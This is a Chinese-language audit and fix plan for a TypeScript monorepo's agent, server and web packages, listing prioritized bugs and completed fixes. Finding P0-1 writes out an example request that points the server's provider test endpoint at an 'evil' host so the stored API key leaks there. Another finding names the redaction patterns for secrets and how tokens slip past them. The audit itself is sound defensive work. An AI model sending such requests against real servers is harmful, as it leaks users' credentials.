# 项目审计与修复方案（2026-07-26）

> ## 执行进度（2026-07-26 修复轮）
>
> **已完成（全部经 typecheck + 测试验证，contract 40 / web 32 / core 183 / agent 166 / server 27 全绿）：**
>
> - **批次 1（安全）**：P0-1 `/api/provider/test` 外泄封堵（存储 key 锁定 baseUrl，新增 `provider-test-policy.test.ts`）；dispatch 全局 Host/Origin 守卫（`rejectUntrustedRequest`，防 DNS rebinding/跨站，新增 `http-guard.test.ts`）；P1-12 `ResolvedPiModel.runtime` 去除明文 apiKey；provider 临时文件 0600 创建。
> - **批次 2（数据完整性）**：P0-2 `wiki_repair` 加 sessionId 归属校验 + 活跃 run 拒绝 + 进程内互斥（+2 测试）；P0-3 `clearPlanDraft` 每轮清草稿、revise 失败 fail-closed（+1 测试）；P0-4 publish 排他锁（进程队列 + 磁盘 lock dir + 陈旧锁回收）、残留清扫、成功后删 aside、staging/publication 重叠拒绝（+3 测试）；P1-16 legacy provider.json 改名 `.bak` 保留密钥。
> - **批次 3（基建）**：P0-5 web test glob 修复（3→32 个测试真正执行）；lint 全绿（含 `WikiProduceGatePanel` attempts useMemo）。
> - **批次 4（契约）**：P1-1 intake schema 重写为真实线上形状（`.strict()`）并在 create/patch 路由强制执行；P1-2 CORS 补 PUT；P1-3 删除死端点 `POST /api/git/probe`；P1-10 planConfirm 默认值统一——**勘误**：schema 默认 false，产品默认是“计划门关”，`session_status` 原写法方向正确，已把 `run-wiki` 对齐为 `=== true` 并加默认值测试。
> - **批次 5（agent 正确性）**：P1-4 删除 `/cancel/i` 正则（仅认 AbortError）；P1-5 retry-policy 实装（domain/reviewer 失败按策略重试一次，已被并行开发者重构为 `runAttemptWithRetry` 保留语义）；P1-6 `wiki_repair` details 自带 `graph` 字段、状态枚举不再借 `producing`（删除 `as never`）；P1-7 `requestTimeoutSeconds` 经 runner 工厂默认值接通所有子会话，超时报独立错误（failed 而非 cancelled）；P1-8 `runScopedAgentsParallel` 逐任务 settle（`failed:true`），失败 leaf 不再拖垮兄弟；P1-9 `contextWindow` 改会话本地拷贝；P1-11 gate 记录写失败时 abort 回收 pending；P1-13 check-architecture 补 ports 禁 runtime/、桶导入/动态 import 匹配、源码级跨包 import 边检查；P1-14 gate 别名（`WikiProduceGate*`→`GateDecision/GateRequest/GatePort`）与 `ProduceRuntime` 别名家族全量迁移删除，`specStore`/`receiptStore`/`GateCoordinator` deprecated 导出删除；P1-15 `workspace-app-state` 读错误不再吞成空态（仅 ENOENT/损坏回落）+ 按路径写队列。
> - **批次 6（web 投影 + 生命周期）**：P1-17 快照带 activeTool 时恢复 `turnActive`/streaming 状态；P1-18 aborted 中性化（`extractAssistantError` 区分 aborted，接通 Transcript 的 system/aborted Marker 分支，不再画错误气泡）；P1-19 快照/直播切换处 assistant 尾部去重；P1-20 发送失败回滚乐观行；P1-21 `abort()` 不再本地合成状态；P1-22 server 优雅停机（SIGINT/SIGTERM dispose live 句柄）+ 60s 定时空闲清扫；连接 toast 卸载时 dismiss。
> - **批次 7（清理，部分）**：删除死模块 `workflow/control-return.ts`；`provider-store.test.ts` 改名 `provider-catalog.test.ts`；`topologyVersion` 硬编码 1 改为按 journal 递增；`SUBMIT_WIKI_RUN_SPEC_TOOL_NAME` 收敛到 contract（消除双定义与 runtime→tools 引用）；`fs-operations.ts` 过期注释更正；`ChatMessage`/`ToolExecutionCard` memo 化；另修复并行开发者引入的 `substituteArgs` `$@` 正则 bug 与 `domainConcurrency` 测试缺字段。web 死组件（WorkspaceShell/Subnav/Timeline 等）已由并行的 UX 重构删除。
>
> **未做/移交：**
> - P2-4 i18n 硬编码清扫、P2-3 死 i18n key、UX 计划 Phase 1-3——i18n 目录与 web 页面正被并行 UX 重构高频改动，做了必冲突，留给该重构收尾。
> - `reviewers` 多模型去相关审阅（P2-11）、redaction 值精确匹配（P2-9）、skill 播种显式化（P2-10）、journal/`root_research` 等零散死导出（P2-2 部分）。
> - Runs 面板 boot-once 刷新（P2-5）属 UX 计划 §8 范畴。
>
> **注意**：修复期间另一方（git user Grok）持续在重构 web 页面与 agent workflow；全仓 typecheck 的瞬时红点均位于其正在编辑的文件（ConfigurePage/WorkspacesPage i18n key 等），与本轮修复无关。提交前务必 `git add -A`（P0-6）并重跑 `pnpm check && pnpm test`。

**范围：** 全仓库工作区状态（含未提交的重构）— `packages/agent` / `server` / `contract` / `core` / `web` / `skill`、ADR 一致性、构建与测试健康度。
**性质：** 仅分析与修复方案，未改动任何代码。
**方法：** 四路并行深度审查（agent 包 / server+contract / web / core+ADR），每条发现均经过源码逐行核实，非猜测。

> ⚠️ 审计期间工作区仍在被另一方主动修改（core 下 `okf-stamp.ts`、`publish.ts` 在审读中途出现/变更）。所有结论以 2026-07-26 当时的工作区为准，**动手修复前请逐条重新确认现状**。

---

## 0. 基线健康度

| 检查 | 结果 |
|------|------|
| `pnpm typecheck`（tsc -b 全仓库） | ✅ 通过 |
| `pnpm test`（全部包） | ✅ 通过（但见 P0-5：web 实际只跑了 3/33 个测试） |
| `pnpm lint` | ❌ **失败**：2 error + 3 warning（详见 P2-1） |
| `pnpm check:architecture` | ✅ 通过（但规则有缺口，见 P1-13） |
| ADR 文档一致性 | ✅ 总体健康：被取代的 ADR 均有明确 banner；CONTEXT.md 实现说明与代码布局吻合；无 Mastra/AI SDK/Python 残留 |

### 经核实、无需重做的健康部分（修复时不要误伤）

- **沙箱层扎实**：`agent/src/runtime/fs-operations.ts` 相对路径守卫、symlink realpath 规范化、写范围限定 `wiki/`+`analysis/`、Source Ignore 在 read/ls/grep 生效；Semantic Workflow 各角色均无 `bash`。
- **单一状态真源基本成立**：`WikiRunPhase` 是 `wiki_produce`/Run Record 的唯一状态真源（`recordStatusFromPhase`/`toolStatusFromPhase`）；例外只有 `wiki_repair`（见 P1-6）。
- **服务端 ADR 0032 合规**：Run HTTP 只读；无产品注入伪事件；SSE 每连接退订/心跳清理正确；session registry 的 open/delete 并发用 single-flight + barrier 处理到位；secrets 不回传客户端；git 无 shell spawn。
- **前端投影架构成立**：`useSessionAgent` + `project/pi.ts` 只折叠快照/Pi 事件/心跳三种形态；gate 状态全部来自 Zod 解析的 `WikiProduceToolDetails`，无自由文本推断；fetch/EventSource 全部集中在 `api.ts`。
- **Skill digest 固定正确执行**：解析顺序与 CONTEXT.md 一致，freeze 时复制、重算并校验 digest、封只读、写入 v2 Run Record。
- **发布 fail-close 成立**：blocking defects 阻断发布（`produce/publishability.ts`、`run-wiki.ts:428`）。
- **测试缝隙隔离正确**：`operator-session-test-seams.ts` 仅经 `./testing` 导出，架构检查禁止生产引用。

---

## P0 — 安全与数据完整性（先修，阻断级）

### P0-1 `/api/provider/test` 可把已存储的 API key 外泄到任意 URL 【安全·高危】

- **位置：** `packages/server/src/routes/provider.ts:196-249`（挂载于 `dispatch.ts:89`）
- **问题：** 请求体省略 `apiKey` 时回落到**已存储**的凭证（`runtime.apiKey`），而 `baseUrl` 与 `headers` 直接取自请求体、无白名单。服务端全 API 无鉴权、无 Origin/Host 校验（`readJsonBody` 接受任意 content-type，POST 属"简单请求"不触发预检），CORS 只限制读响应不限制发请求。恶意网页/本机进程/LAN 主机（`OKF_WIKI_ALLOW_LAN=1` 时）可 `POST {"baseUrl":"https://evil"}` 让服务端把真实 key 以 auth header 发给攻击者。DNS rebinding 也未防护。
- **修复方案：**
  1. `test` 端点仅允许两种模式：显式携带 `apiKey`（测新 key），或使用存储 key 时 **`baseUrl` 强制取存储的 provider 配置值**、忽略请求体覆写；禁止自定义 `headers` 与存储 key 组合。
  2. 全局加最小防线：校验 `Host` 头为 `127.0.0.1/localhost[:port]`（防 rebinding）+ 校验非空 `Origin` 必须命中回环白名单，否则 403；LAN 模式下要求随机 token（启动时打印/写入产品目录）。
  3. `provider-catalog.ts:150-158`：secrets 临时文件先以默认 umask 写入再 chmod 0600，存在世界可读窗口 → 改为 `open` 时直接带 `mode: 0o600`（或先 `chmod` 再写内容）。
- **验证：** 新增路由测试：无 Origin/坏 Host 403；省略 apiKey 时 baseUrl 覆写被拒；临时文件权限断言。

### P0-2 `wiki_repair` 无 run 归属与互斥校验，可跨 Session 并发写同一 Staging 【正确性·高危】

- **位置：** `packages/agent/src/tools/wiki-repair.ts:26-34, 152-181`
- **问题：** 输入声明了 `sessionId` 但 `execute` 从不读取；按 `runId` 直接 `loadRun`，不校验 `record.sessionId` 与调用方 Session 一致，也无跨 Session 锁。两个 Operator Session（或 repair 与原 `wiki_produce` 仍挂起的 publication gate 竞争）可并发写同一 Staging Wiki——`executionMode: "sequential"` 只序列化单 Session 内的工具。违背 ADR 0032 "Wiki Run 链接其 Operator Session"。
- **修复方案：** ① `execute` 内强制 `record.sessionId === 调用方 sessionId`，否则拒绝并提示经原 Session 操作；② 引入按 `runId` 的进程内互斥（可复用 `run-store` mutex 模式），repair 与 pending publication gate 互斥：run 处于 `awaiting_publication` 时拒绝 repair（或先取消 gate）。
- **验证：** 补测试：跨 session 调用被拒；awaiting_publication 期间 repair 被拒。

### P0-3 计划重规划轮次静默回落到上一轮旧草稿，操作员反馈被丢弃 【正确性·高危】

- **位置：** `packages/agent/src/workflow/phases/plan-phase.ts:36-63` + `workflow/gate-protocol.ts:169-177`
- **问题：** `analysis/plan-draft.json` 在 plan gate `revise` 轮次间不删除、不指纹。若 revision planner agent 未能调用 `submit_wiki_run_spec` 即出错，`readPlanDraft` 会读回**上一轮**草稿，循环把旧 Spec 当作重规划成功再次送审，操作员反馈静默丢失、无任何报错。所谓 fail-closed 只在首轮成立（freeze 建新 workdir）。
- **修复方案：** 进入每个 revise 轮前删除 `plan-draft.json`（或在草稿中记录轮次指纹/gate 序号，读取时校验匹配）；不匹配或缺失时 fail-closed：报错并把 planner 失败原因带回 gate。
- **验证：** 测试：revision agent 不提交 spec 时，run 报错而非重放旧 spec。

### P0-4 发布路径：无排他锁 + 崩溃清理是 no-op + `.prev` 目录无限累积 【数据完整性·高危】

- **位置：** `packages/core/src/publish.ts:131-136, 181-207`
- **问题：**
  1. ADR 0017 明确要求"并发发布同一路径 fail-close（排他发布锁）"，实际无任何锁；并发发布可交错 aside/install 重命名，失败方的"尽力恢复"可能把**过期树**盖回胜者的新发布。
  2. "清理上次崩溃残留 candidate"的 `rm` 使用**本次** `Date.now()` 生成的路径，永远匹配不到旧的 `.next.<oldstamp>`，孤儿永不清理。
  3. 成功路径从不删除 `.prev.<ts>` aside，每次发布都完整复制留存一份旧 wiki（ADR 0017 说保留"不是产品特性"）。
- **修复方案：** ① 按 `publicationPath` 加文件锁（lockfile + O_EXCL 或进程内 mutex + 磁盘 lock 双保险），持锁期间完成 aside→install；② 清理逻辑改为按 glob `*.next.*` / 前缀扫描父目录删除残留；③ 成功 swap 后删除本次 aside（保留策略若要做，显式配置）；④ 同时补 ADR 0017 要求的 staging/publication 路径不相交校验（`publish.ts:75-142` 现在不查嵌套，配置错误会递归自拷贝）。另：`publish.ts:131` 的局部 `stamp = Date.now()` 与 OKF `input.stamp` 概念混淆，建议改名。
- **验证：** 测试：并发两次 publish 一成一败且结果树正确；伪造 `.next.*` 残留被清理；成功后无 `.prev.*` 遗留；publicationPath 嵌套 staging 被拒。

### P0-5 web 测试脚本 glob 不递归：33 个单测只有 3 个真正在跑 【测试基建·高危】

- **位置：** `packages/web/package.json:12`：`"test": "node --experimental-strip-types --test src/**/*.test.ts"`
- **问题：** POSIX `sh` 下 `**` 不递归，只匹配到 `src/wiki/page-tree.test.ts`（3 个测试）；投影器（`project/pi` 相关）、view-model、summary、workspace-path 等 30 个测试全部被静默跳过——**最安全关键的投影器代码实际没进 CI**。
- **修复方案：** 改用 `node --test --experimental-strip-types "src/"`（node test runner 自带递归发现）或显式 `glob` 支持（Node 22 `--test` 接受目录）；CI 中断言测试数量下限亦可。
- **验证：** `pnpm --filter @okf-wiki/web test` 报告 33 个测试。

### P0-6 在飞重构的提交完整性：已跟踪文件 import 未跟踪文件 【流程·高危】

- **位置：** 例：`packages/core/src/publish.ts:4` → 未跟踪 `okf-stamp.ts`；`core/src/index.ts:68-92` → 未跟踪 `provider-catalog.ts`/`provider-runtime.ts`；server 的 `agent-session/` 目录、web 共 39 个源文件均未跟踪。
- **问题：** 只提交已修改文件而漏 `git add` 新文件会得到 broken commit。
- **修复方案：** 提交前 `git add -A` 并在干净 checkout 验证 `pnpm check && pnpm test`；顺手删除空的未跟踪 `examples/` 目录。`provider-store.ts` 删除本身干净（全仓库无残留引用，已核实）。

---

## P1 — 架构与正确性（下一批）

### 契约与前后端

1. **contract intake schema 形同虚设（契约漂移）** — `packages/contract/src/intake.ts` 的 `WorkspaceCreateSchema`/`WorkspacePatchSchema` 在 server/web **零引用**（仅自测引用）；路由手写校验且已与 schema 分叉：create 实收 `publicationPath`/`modelProfileId`（schema 没有），patch 实收 `publicationPath`/`planConfirm`/`modelProfileId`/`model` 且**静默忽略未知键**（schema 是 `.strict()`）。
   **修复：** 以真实线上形状为准更新 schema，然后在 `workspaces.ts:54-88, 103-230` 路由入口真正 `safeParse`，未知键拒绝；其余 POST/PATCH 路由同样接入 contract schema，让"共享契约"成为事实边界。
2. **CORS 缺 `PUT`** — `dispatch.ts:33` 只声明 `GET, POST, PATCH, DELETE, OPTIONS`，但 `PUT /api/provider/default|providers/:id|models/:id` 三条路由存在且 web 在调（`api.ts:289,304`）。跨源部署（`VITE_API_BASE`）时预检失败，静默弄坏"设默认模型/更新模型/更新 provider"。**修复：** 补 `PUT`，并加一条跨源 e2e/集成测试。
3. **死端点决策** — `GET /runs/:runId/graph`（`routes/runs.ts:29`）与 `POST /api/git/probe`（`provider.ts:283`）web 零调用（graph 由 SSE 内联 details 提供）。**修复：** 要么删除，要么在文档标注为外部只读 API；不要留无主表面。

### agent 包

4. **取消状态靠 `/cancel/i` 正则猜测** — `workflow/run-wiki.ts:511-524`：任何 message 含 "cancel" 的真实失败都被记为 `cancelled` 且 `error: null`，掩盖真实故障。**修复：** 只依据显式取消信号（abort signal / 专用 error class），删除正则分支。
5. **重试策略计算后被丢弃（死机制）** — `research-phase.ts:161-167`、`review-repair-phase.ts:175-181` 均 `const retry = decideNodeRetry({...}); void retry;` 后无条件失败处理；`retry-policy.ts` 全部不可达。**修复：** 二选一并写明：实装节点级重试（含 `needs_input`/瞬态区分），或删除 retry-policy 模块与"T1 policy consult"注释，避免误导。
6. **`wiki_repair` 双状态枚举经 `as never` 灌入** — `tools/wiki-repair.ts:53-58, 111-113, 221-229`：声明 details 状态为 `repairing|repaired|failed|cancelled`，实际中途推送 `wiki_produce` 形状（`status:"producing"`+graph/spec 字段）。这正是 CONTEXT.md 禁止的"dual status enums"。**修复：** 为 repair 定义独立 details schema 与 accumulator（或复用 produce schema 并统一声明类型），删除 `as never`。
7. **预算/超时是死管道** — 契约 `WorkspaceLimitsSchema` 的 `requestTimeoutSeconds`/`inputTokensLimit`/`outputTokensLimit`/`totalTokensLimit`/`maxSteps` 只有 `contextTargetTokens` 被消费；`AgentRunRequest.timeoutMs` 贯穿 `ports/agent-runner.ts:56`→`scoped-runner.ts:52`→`run-scoped-agent.ts:222-224` 但**无生产调用方设置**。子 Pi session 没有任何墙钟/token/轮次预算，违背 Run Boundary "mount budgets" 职责。**修复：** 在 `run-wiki`/phase 层把 workspace limits 换算成每子 session 的 `timeoutMs` 与 token 上限并真正传入；超时触发时给专属 `errorClass`（与普通 abort 区分，见 `assistant-outcome.ts:55`）。
8. **一个 leaf 失败丢掉整批结果、兄弟会话继续烧预算** — `runtime/run-scoped-agent.ts:309-328`（`Promise.all`）+ `research-phase.ts:78-112`。**修复：** 改 `Promise.allSettled` 逐 leaf 收敛：成功者照常挂 receipt，失败者单独记 FAILED；批级 catch 只兜底不可恢复错误；失败时向兄弟传播 abort。
9. **共享 Pi `Model` 对象被就地改 `contextWindow`** — `runtime/create-wiki-session.ts:148-152`：模型句柄按角色解析一次、被计划/并行 leaf/domain 会话乃至长驻 Operator Session 共享，并发不同预算互相覆写。**修复：** 不可变处理——浅拷贝出带覆写 contextWindow 的模型对象再传入会话。
10. **`session_status` 汇报反了 plan-confirm 默认值** — `tools/session-status.ts:60`（`=== true`）vs `run-wiki.ts:374`（`!== false`，默认开）。Operator Agent 会告诉操作员"未开启计划确认"而 run 实际会停在 `awaiting_plan`。**修复：** 统一为 `!== false`，抽一个共享 helper 防再漂移。
11. **gate 挂起泄漏窗口** — `workflow/gate-protocol.ts:126-152, 197-223`：先注册 pending decision 再 `updateRunRecord`，record 写失败时被 `.catch(()=>undefined)` 吞掉，遗留无消费者的 pending gate。**修复：** record 写失败时显式回收 pending 注册并让 gate 以错误收敛。
12. **`ResolvedPiModel.runtime` 携带明文 apiKey 回传调用方** — `runtime/model/provider-model.ts:221-237`。任何日志/序列化 `resolved.runtime` 即泄密。**修复：** runtime 快照只含 source/host 等非敏感字段。

### 架构守卫

13. **`check-architecture.mjs` 规则缺口** —
    - ports 规则未禁 `../runtime/`（ADR 0033 §3 明文要求）；
    - workflow 规则的正则要求目录后必须有子段，`from "../tools"` 桶导入与动态 `import()` 可绕过；
    - 包依赖只查 `package.json`、不查源码 import。
    **修复：** 补 `runtime/` 禁令；正则改为匹配目录本身（含桶导入）与 `import(` 动态形式；增加基于源码的跨包 import 扫描（当前实际 import 已核实干净，趁干净时上锁）。
14. **半吊子的 deprecated 别名迁移（违背 ADR 0029/0033 §5 no-compat）** — `ports/gate-port.ts:32-37`、`runtime/fixture-runner.ts:16-21`、`produce/living-spec.ts:36-37`、`produce/receipts.ts:13-14`、`run-wiki.ts:537`：deprecated 别名反而是 index/tools/server 调用点在用的**主名**。**修复：** 一次性把调用点迁到新名并删除别名（no-compat 文化下不该留桥）。

### core 状态文件

15. **`~/.okf-wiki` 状态：无锁 RMW + 吞错清空** — `workspace-app-state.ts:51-68, 112-151`：读失败（如瞬时 `EACCES`）→ 空状态 → 下次写入即持久化清空 recent 列表；并发注册 last-write-wins。**修复：** 读仅对 `ENOENT`/解析失败回落空、其他错误上抛；套用 `run-store` 的按路径 mutex；写入统一走 `core/src/atomic-write.ts`（见 P2-8 去重）。
16. **legacy provider 凭证静默清空** — `provider-catalog.ts:83-96`：无效/旧版 `provider.json` → 空 catalog，下次保存**覆盖原文件**永久删 key，无备份无告警。**修复：** 加载失败时把原文件改名 `provider.json.bak.<ts>` 并在 doctor/日志明示，然后再以空 catalog 起步（与 no-compat 不冲突）。

### web 投影正确性

17. **SSE 重连丢失 agent 运行状态** — `hooks/useSessionAgent.ts:167-171` + `project/pi.ts:627`：`status:"streaming"` 只由活事件 `agent_start` 设置，快照路径硬置 `turnActive:false`。中途断线重连后 Composer 显示 Ready、Stop 消失、`send()` 判断失真。**修复：** 服务端快照已带 `activeTool`；据此（或在 snapshot 里带 `turnActive`/agent 运行标志，服务端知道真值）恢复 `status`/`turnActive`。
18. **用户 Stop 被渲染为错误 + 目标 UX 分支不可达** — `project/format.ts:146`（`aborted` 归为 `isError`）+ `useSessionAgent.ts:66-76`（`status:"error"` 与 `abort()` 的 `setStatus("idle")` 竞态）；`Transcript.tsx:81` 的中性 aborted Marker 分支无人能产生（reducer 从不产出 `status:"aborted"`）。**修复：** `stopReason==="aborted"` 归类为中性 aborted，接通 Marker 分支，去掉错误横幅路径。
19. **快照/直播切换处 assistant 消息可重复** — `project/pi.ts:420-439`：服务端在历史加载期缓冲事件再重放，已在快照内的 `message_end` 会再追加一张重复卡片；客户端用随机 id 不与 Pi 消息身份关联。**修复：** 投影器用 Pi 消息 id（或 message_end 的稳定标识）做幂等去重；工具事件已按 `toolCallId` 幂等，可仿照。
20. **失败发送的乐观行不回滚** — `useSessionAgent.ts:216-243`：`isCommandFailed` 只弹错、不移除乐观 user 行，直到下次全量快照。**修复：** 命令失败即回滚该行（或标记"未送达"态）。
21. **`abort()` 本地合成状态** — `useSessionAgent.ts:263-269`：本地丢弃 `streamingMessage`、强置 `turnActive:false`，与"纯投影"相悖且与 finding 18 叠加出闪烁。**修复：** abort 只发命令+置"stopping"过渡态，等 Pi `agent_end`/`message_end(aborted)` 收敛。

### 服务生命周期

22. **无优雅停机 + 空闲 session 只靠机会式清扫** — `main.ts` 无 SIGINT/SIGTERM 处理；`live-session-registry.ts:120-136` 的 TTL 清扫只在三个入口顺带执行，静默服务器永不回收。**修复：** 加信号处理（dispose 所有 live handle、结束 SSE）；加一个低频 `setInterval` 定时清扫（unref）。

---

## P2 — 清理与打磨（结伴修，避免独立 PR 噪音）

1. **lint 转绿** — `agent/src/tools/wiki-repair.ts:70`（无用赋值）、`core/src/okf-stamp.ts:118`（非法空白字符）2 个 error；`web/.../WikiProduceGatePanel.tsx:51` 的 `attempts` 每渲染新数组破坏 3 处 `useMemo` deps（自身也是真实性能 bug，包一层 `useMemo`）。
2. **agent 死代码清单**（grep 核实零调用）：`workflow/control-return.ts`；`produce/receipts.ts`（仅自测引用）；`ports/index.ts` 桶；`ports/wiki-writer.ts` 的 `WikiWriter`（`repairWiki` 应改用它而非全量 `AgentRunner`，ADR 0033 表格未落地）；`journal.ts:55-98` 的 `startAttempt/completeAttempt`；角色 `root_research`；`prompts/system.ts` 的 `typeForTemplate`；`contract.assertPhaseTransition` 存在但 `runWiki.setPhase`（`run-wiki.ts:223-232`）从不断言——建议接上而非删除。
3. **web 死代码清单**（UX 计划附录 A 的 kill list 未执行）：`WorkspaceShell.tsx`、`WorkspaceSubnav.tsx`、`Layout.tsx`、`app-sidebar.tsx`（互相引用成孤岛）、`run-graph/Timeline.tsx`、`NodeAttemptInspector.tsx`；未消费的 shadcn `resizable/progress/accordion/hover-card` 与依赖 `react-resizable-panels`（若近期做 UX Phase 1/3 则留，否则删）；死 i18n key（`runStatus.*` 大部、`subnav.*`、`planConfirm.*` 若干等）；`index.css` 中 `.subnav`、`[data-testid="run-page"]` 死规则。
4. **i18n 硬编码清扫**（zh 环境可见英文 / WCAG 2.5.3 标签不一致）：`AgentWorkspaceShell.tsx:203-225, 345, 355` 的 aria-label/SheetTitle；`ContextPanels.tsx:43` 字面 `Open`；`ErrorBoundary.tsx:49-64` 整块英文；`WorkspaceSourcesPage.tsx:49-62` probe 标签；`message-scroller.tsx:114`；原始枚举直显（`RunGraphCanvas.tsx:205`、`NodeAttemptDialog.tsx:207`、`WikiProduceGatePanel.tsx:117`——`t.runStatus.*` 目录 7 个 key 有 6 个闲置，接上即可）。注意 `e2e/ui-a11y-shell.spec.ts:120-142` 断言的是英文 aria-label，修 i18n 时同步改 e2e。
5. **杂项正确性小修**：`AgentWorkspacePage.tsx:88-91` Runs 面板 boot-once 不刷新（UX 计划 §8 已点名）；`:205-226` 会话标题模板匹配脆弱；`:127-133` 路由切换瞬时错配 workspaceId；`SessionList.tsx:155-158` hover-only 删除按钮触屏不可见；`AgentWorkspaceShell.tsx:114-148` `duration: Infinity` 连接 toast 无卸载清理跨页残留；`format.ts:144` 的 `("error"+"Message")` 字符串拼接取字段应还原为直写。
6. **转录热路径性能**：`Transcript.tsx:245-253` 每 tick 新数组 + `ChatMessage`/`ToolExecutionCard` 未 memo，工具密集回合全量重渲染并重算最长 12KB 的字符串格式化。`memo` + 稳定 key 即可。
7. **拓扑/图一致性小问题**：`run-wiki.ts:296` replan 后 `topologyVersion` 硬编码 1（`:268` 的递增逻辑被绕过）；`produce/topology.ts` 为全部 spec 节点建图但 `research-phase.ts:38,46` 按 fan-out 截断，被截断节点永远无 attempt 挂在图上——图应只含实际调度节点或标注 truncated；`SUBMIT_WIKI_RUN_SPEC_TOOL_NAME` 双定义（`tools/submit-wiki-run-spec.ts:11` 与 `plan-phase.ts:24`）应收敛到 contract 层常量。
8. **重复工具代码去重**：`workspace-config.ts:160`、`workspace-app-state.ts:73`、`provider-catalog.ts:150`、`agent/src/produce/defects.ts:199` 各自手写 temp+rename，统一走 `core/src/atomic-write.ts`；`skill-fork.ts:71-77, 118-125` 相同 `cp` filter 抽函数。
9. **redaction 局限周知**：`agent/src/redact/index.ts:101-116` 深度 10 层封顶、仅识别 `sk-`/`Bearer`/`api_key=` 等模式，非常规格式 token 可穿透到 SSE；`dispatch.ts:308-309` 原样打 `error.stack`。可将已知存储 key 值做精确替换（值匹配优于模式匹配）。
10. **skill 解析两个 nit**：`skill-path.ts:190` 工作区项目 skill 被标 `kind:"fork"`（从未 fork）；`skill-path.ts:196` 解析时**副作用**静默播种 `~/.agents/skills`，且 `loadHomeSkills` 默认 true 导致 home 副本永久遮蔽后续包内 skill 升级（陈旧漂移）——播种应显式化或在 doctor 提示版本落后。
11. **文件/命名卫生**：`core/src/provider-store.test.ts` 改名（实测 provider-catalog/runtime）；`provider-runtime.ts:131` 的 `apiKey:"local"` 哨兵值换成显式 union；`packages/server` 的 `build` 脚本 `noEmit` 空转、缺 `composite` 但被根 tsconfig 引用（现在能跑、脆弱）；`reviewers` 契约允许 4 模型去相关审阅但 `role-model.ts:42-45` 只用 `reviewers[0]`——要么实装要么收窄契约；`fs-operations.ts:550-552` 过期注释更正。

---

## UX/UI 现状对照（与 `docs/design/ux-ui-refactor-plan-2026-07.md`）

该计划自评"plan only — not implemented"，实际是**部分实施后停在半途**：

- ✅ 已落地：路由已改 id-only（双命名空间已删）；`read` 工具 header-only bug 已修；shadcn 组件已安装。
- ❌ 未落地（P0 项）：run graph 有 `vm.edges` 但从不画边（仅 `sr-only` 供测试）；`wiki_produce` cockpit 仍嵌在工具展开的 10px mono 区；右栏 `ContextPanels` 仍是静态 link-out stub、无 Run tab；CommandMenu 仍是计划否定的"2-item stub"；SessionList 无状态 chips；面板仍固定 `w-52/w-60`（resizable 装了没用）。
- 🧟 残留：计划附录 A 的 kill list（WorkspaceSubnav 等 4 个死组件、死 CSS、`rootPath` query——`ConfigurePage` 内嵌的两个旧页面仍在读 `rootPath` query 且同页三次重复 `getWorkspace`）。

**建议：** 把 UX 计划的 Phase 1-3 与上面 P2-3/P2-4/P2-5 合并推进，避免对死组件做无用修复；或明确砍掉计划范围、先执行 kill list。

---

## 建议执行顺序

| 批次 | 内容 | 理由 |
|------|------|------|
| 批次 1（安全） | P0-1、P1-12、P0-1③ 文件权限 | 凭证外泄是唯一可被外部利用的问题 |
| 批次 2（数据完整性） | P0-2、P0-3、P0-4、P1-16 | 都会静默破坏 run/发布/凭证数据 |
| 批次 3（测试与提交基建） | P0-5、P0-6、P2-1（lint 转绿） | 让 CI 真正兜底，后续修复才可信 |
| 批次 4（契约收口） | P1-1、P1-2、P1-3、P1-10 | 前后端边界成为事实契约 |
| 批次 5（agent 正确性） | P1-4~P1-9、P1-11、P1-13~P1-15 | 运行时行为与 ADR 对齐 |
| 批次 6（web 投影收口） | P1-17~P1-21、P1-22 | 纯投影承诺补最后四个缺口 |
| 批次 7（清理+UX） | P2 全部 + UX 计划 Phase 1-3 决策 | 结伴修，减少 PR 噪音 |

每批完成标准：`pnpm check`（typecheck+lint+format+architecture）与 `pnpm test` 全绿，且本文件对应条目勾销。
